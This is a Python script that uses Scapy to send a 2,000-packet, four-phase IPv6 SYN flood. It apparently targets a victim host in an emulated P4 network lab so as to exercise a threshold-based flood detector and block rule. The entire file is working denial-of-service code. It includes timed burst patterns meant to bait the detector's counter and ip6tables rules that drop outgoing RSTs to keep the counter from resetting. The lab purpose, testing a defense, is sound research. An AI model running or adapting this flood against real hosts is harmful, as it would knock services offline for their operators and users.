"""
attack.py — SYN Flood attacker script (versatile 4-phase pattern)
Auto-detects own interface, self-assigns IPv6 if p4-utils didn't.
Uses Scapy sendp() — L2 injection, no kernel ARP/NDP needed.

Traffic pattern (2000 total SYNs):
  Phase 1 —   60 burst       (below threshold 64 — baiting the counter)
  Phase 2 — 1000 super-fast  (controller fires THRESHOLD at SYN #64 total)
  Phase 3 —   64 burst       (second threshold batch)
  Phase 4 —  876 super-fast  (sustained flood — all dropped by block rule)

Run from any attacker host xterm:
    python3 /home/ayush/my/attack.py
"""

import re, sys, time, logging, subprocess
from scapy.all import Ether, IPv6, TCP, sendp

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

subprocess.run(['sysctl', '-w', 'net.ipv6.conf.all.disable_ipv6=0'], capture_output=True)
subprocess.run(['sysctl', '-w', 'net.ipv6.conf.default.disable_ipv6=0'], capture_output=True)

# Block outgoing RSTs so the kernel doesn't send RST-ACK when h0 replies
# with SYN-ACK (Scapy's raw SYNs are unknown to the kernel). Without this
# the RST hits P4's ACK branch and decrements the CMS counter back to 0.
subprocess.run(['ip6tables', '-F', 'OUTPUT'], capture_output=True)
subprocess.run(['ip6tables', '-A', 'OUTPUT', '-p', 'tcp',
                '--tcp-flags', 'RST', 'RST', '-j', 'DROP'], capture_output=True)

VICTIM_IP   = "2001:1:1::100"
VICTIM_MAC  = "aa:00:00:00:00:00"
DST_PORT    = 80
TOTAL_SYNS  = 2000

# h0 + 60 client hosts. Used as fallback when p4-utils' setIntfIp didn't
# successfully land an IPv6 on the interface — common in WSL2 because
# new netns inherit net.ipv6.conf.default.disable_ipv6=1.
IPV6_MAP = {'h0': '2001:1:1::100'}
IPV6_MAP.update({f'h{i}': f'2001:1:1::{i:x}' for i in range(1, 61)})


def get_iface_info():
    result = subprocess.run(['ip', 'link'], capture_output=True, text=True)
    iface = None
    for line in result.stdout.split('\n'):
        m = re.search(r'\d+:\s+([\w-]+eth\d+)', line)
        if m:
            iface = m.group(1)
            break
    if not iface:
        print("ERROR: could not detect interface")
        sys.exit(1)

    result = subprocess.run(['ip', 'link', 'show', iface], capture_output=True, text=True)
    mac_m = re.search(r'link/ether ([0-9a-f:]+)', result.stdout)
    mac = mac_m.group(1) if mac_m else None

    result = subprocess.run(['ip', '-6', 'addr', 'show', iface], capture_output=True, text=True)
    ip6_m = re.search(r'inet6 (2001[0-9a-f:]+)/\d+', result.stdout)
    if ip6_m:
        ipv6 = ip6_m.group(1)
    else:
        hostname = iface.split('-eth')[0]
        ipv6 = IPV6_MAP.get(hostname)
        if ipv6:
            subprocess.run(['ip', '-6', 'addr', 'add', 'nodad', ipv6 + '/64', 'dev', iface],
                           capture_output=True)
            print(f"[attack] Assigned {ipv6}/64 to {iface}")
        else:
            print(f"ERROR: unknown host {hostname}, add to IPV6_MAP")
            sys.exit(1)

    return iface, mac, ipv6


iface, src_mac, src_ipv6 = get_iface_info()

if not src_mac:
    print(f"ERROR: could not detect MAC on {iface}")
    sys.exit(1)

print(f"[attack] Host   : {src_ipv6} ({src_mac}) on {iface}")
print(f"[attack] Target : {VICTIM_IP}:{DST_PORT}")
print(f"[attack] Pattern: 60 burst -> 1000 fast -> 64 burst -> 876 fast  (2000 total)")


def send_phase(label, n, inter, start_idx):
    speed = "burst (max)" if inter == 0 else f"{1/inter:.0f} pps"
    print(f"[attack] {label}  {n} SYNs @ {speed} ...")
    t0 = time.time()
    for j in range(n):
        pkt = (Ether(src=src_mac, dst=VICTIM_MAC) /
               IPv6(src=src_ipv6, dst=VICTIM_IP) /
               TCP(sport=10000 + start_idx + j, dport=DST_PORT,
                   flags="S", seq=1000 + start_idx + j))
        sendp(pkt, iface=iface, verbose=0)
        if inter > 0:
            time.sleep(inter)
    elapsed = time.time() - t0
    actual_pps = n / elapsed if elapsed > 0 else 0
    print(f"[attack]   done  {actual_pps:.0f} actual pps  ({elapsed:.2f}s)")
    return start_idx + n


idx = 0
idx = send_phase("Phase-1 burst-60   (below threshold):", 60,   0,     idx)
idx = send_phase("Phase-2 fast-1000  (triggers threshold):", 1000, 0.001, idx)
idx = send_phase("Phase-3 burst-64   (second threshold batch):", 64,   0,     idx)
idx = send_phase("Phase-4 fast-876   (post-block flood):", 876,  0.001, idx)

print(f"[attack] Done — {TOTAL_SYNS} SYNs sent from {src_ipv6}")
